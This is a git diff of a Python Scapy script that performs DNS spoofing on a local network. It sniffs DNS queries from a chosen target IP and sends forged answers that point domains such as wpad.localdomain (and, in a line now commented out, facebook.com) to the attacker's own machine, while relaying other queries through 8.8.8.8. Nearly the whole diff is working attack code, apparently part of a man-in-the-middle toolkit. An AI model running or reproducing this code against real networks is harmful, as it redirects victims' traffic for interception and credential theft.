@@ -14,20 +14,20 @@ from networking_functions import get_local_ip
 local_ip = get_local_ip()
 
 hosts_dict = {
-    "facebook.com.": local_ip,
+    # "facebook.com.": local_ip,
     "something.hello.": local_ip,
-    "wpad.localdomain.": local_ip
+    "wpad.localdomain.": local_ip,
+    # "1.2.168.192.in-addr.arpa.": local_ip
 }
-
 
 domains = hosts_dict.keys()
 
 
-def forge_packet_better(packet_to_forge, target_ip,router_ip):
-
-    original_qname = packet_to_forge[DNSQR].qname
-    print(packet_to_forge[DNS].qd.qname.decode('UTF-8'))
-    print(str(original_qname))
+def forge_packet_better(packet_to_forge, target_ip, router_ip):
+    print(packet_to_forge)
+    original_qname = packet_to_forge[DNSQR].qname.decode('UTF-8')
+    # original_qname = packet_to_forge[DNS].qd.qname.decode('UTF-8')
+    print(original_qname)
     if str(original_qname) in domains:
         print("DETECTED DNS TO FORGE")
         fake_dns_packet = IP()/UDP()/DNS()/DNSRR()
@@ -44,14 +44,14 @@ def forge_packet_better(packet_to_forge, target_ip,router_ip):
         fake_dns_packet[DNS].qr = 1
         fake_dns_packet[DNS].ancount = 1
 
-        fake_dns_packet[DNSRR].qname = str(original_qname)
-        fake_dns_packet[DNSRR].rrname = str(original_qname)
+        fake_dns_packet[DNSRR].qname = packet_to_forge[DNSQR].qname
+        fake_dns_packet[DNSRR].rrname = packet_to_forge[DNSQR].qname
         fake_dns_packet[DNSRR].rdata = local_ip
 
         print(f"Sending spoofed DNS packet: {original_qname} = {local_ip}")
         send(fake_dns_packet, verbose=0)
     else:
-        forward_packet = IP()/UDP()/DNS()
+        forward_packet = IP() / UDP() / DNS()
         forward_packet[IP].dst = '8.8.8.8'
         forward_packet[UDP].sport = packet_to_forge[UDP].sport
         forward_packet[DNS].rd = 1
@@ -59,13 +59,14 @@ def forge_packet_better(packet_to_forge, target_ip,router_ip):
 
         google_response = sr1(forward_packet, verbose=0)
 
-        response_packet = IP()/UDP()/DNS()
+        response_packet = IP() / UDP() / DNS()
         response_packet[IP].src = local_ip
         response_packet[IP].dst = target_ip
         response_packet[UDP].dport = packet_to_forge[UDP].sport
         response_packet[DNS] = google_response[DNS]
 
         send(response_packet, verbose=0)
+
 
 def forge_packet(packet_to_forge, fake_server_ip):
     RR_TTL = 60
@@ -74,6 +75,7 @@ def forge_packet(packet_to_forge, fake_server_ip):
                     UDP(sport=packet_to_forge[UDP].dport, dport=packet_to_forge[UDP].sport) / \
                     DNS(id=packet_to_forge[DNS].id, qr=1, aa=1, qd=packet_to_forge[DNS].qd, an=forged_DNSRR)
     return forged_packet
+
 
 def process_dns_packet(packet_to_process, target, router_ip):
     # print(packet_to_process[DNS].qd.qname.decode('UTF-8'))
@@ -84,39 +86,28 @@ def process_dns_packet(packet_to_process, target, router_ip):
         print("packet of target")
         forge_packet_better(packet_to_process, target, router_ip)
 
-            # forged_packet = forge_packet(packet_to_process, ip)
+        # forged_packet = forge_packet(packet_to_process, ip)
 
-            # send(forged_packet, verbose=0)
-            # print(
-            #     f"[*] Forged DNS response sent. Told {packet_to_process[IP].src} that {packet_to_process[DNS].qd.qname.decode('UTF-8')} was at {ip}")
+        # send(forged_packet, verbose=0)
+        # print(
+        #     f"[*] Forged DNS response sent. Told {packet_to_process[IP].src} that {packet_to_process[DNS].qd.qname.decode('UTF-8')} was at {ip}")
 
 
-def dns_packet_handler(packet_to_process, target):
-    if packet_to_process.haslayer(DNS) and packet_to_process[DNS].qr == 0:
-        print(packet_to_process[DNS].qd.qname.decode('UTF-8'))
-        print(packet_to_process[IP].src)
-        current_domain = packet_to_process[DNS].qd.qname.decode('UTF-8')
-        if current_domain in domains:
-            print(packet_to_process)
-            ip = hosts_dict[current_domain]
-            if target is None or packet_to_process[IP].src == target:
-                forged_packet = forge_packet(packet_to_process, ip)
-                send(forged_packet, verbose=0)
-                print(
-                    f"[*] Forged DNS response sent. Told {packet_to_process[IP].src} that {packet_to_process[DNS].qd.qname.decode('UTF-8')} was at {ip}")
-
-def start_dns_poisoning(interface_to_listen, target, printing_queue, verbosity):
+def start_dns_poisoning(interface_to_listen, target_ip, router_ip, printing_queue, verbosity):
     cancel_token = threading.Event()
     dns_thread = threading.Thread(target=dns_poisoning_loop,
-                                  args=(interface_to_listen, target, printing_queue, verbosity, cancel_token))
+                                  args=(
+                                  interface_to_listen, target_ip, router_ip, printing_queue, verbosity, cancel_token))
     dns_thread.start()
     return cancel_token
 
-def dns_poisoning_loop(interface_to_listen, target, printing_queue, verbosity, cancel_token):
+
+def dns_poisoning_loop(interface_to_listen, target_ip, router_ip, printing_queue, verbosity, cancel_token):
+    print("[+] Starting dns poisoning loop")
+    bpf_filter = f'udp dst port 53 and not src host {local_ip} and src host {target_ip}'
     while not cancel_token.is_set():
-        sniff(iface=interface_to_listen, prn=lambda pkt: dns_packet_handler(pkt, target), store=0, count=1)
+        sniff(iface=interface_to_listen, prn=lambda pkt: forge_packet_better(pkt, target_ip, router_ip), store=0,
+              count=1, filter=bpf_filter)
 
-
-if __name__ == "__main__":
-    dns_thread_token = start_dns_poisoning("wlan0", "192.168.2.100", 0, 1)
-
+# if __name__ == "__main__":
+#     dns_thread_token = start_dns_poisoning("wlan0", "192.168.2.100", 0, 1)
